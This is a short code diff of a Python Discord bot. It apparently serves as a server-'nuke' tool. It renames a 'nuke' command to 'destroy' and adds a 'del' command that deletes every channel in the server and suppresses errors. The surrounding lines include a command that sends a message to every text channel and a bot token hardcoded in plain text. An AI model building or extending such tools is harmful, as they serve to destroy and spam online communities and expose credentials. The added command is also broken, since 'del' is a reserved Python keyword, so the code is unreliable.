@@ -28,7 +28,7 @@ token = 'ODM1NTI2OTI1MTI3NTE2MjIx.YIQvFg.hdn7b7WgAI8S3-1XDeWYTXWd3Oo'
 
 
 @client.command()
-async def nuke (ctx):
+async def destroy (ctx):
     guild=ctx.message.guild
     await ctx.message.delete()
     
@@ -56,5 +56,16 @@ async def s(ctx, *, message ):
            for channel in guild.text_channels:
                  await channel.send(f"{message}")
 
+@client.command()
+async def del (ctx):
+    guild=ctx.message.guild
+    await ctx.message.delete()
+    
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print(f"{channel.name} has been deleted")
+        except:
+             pass
 
 client.run(token)
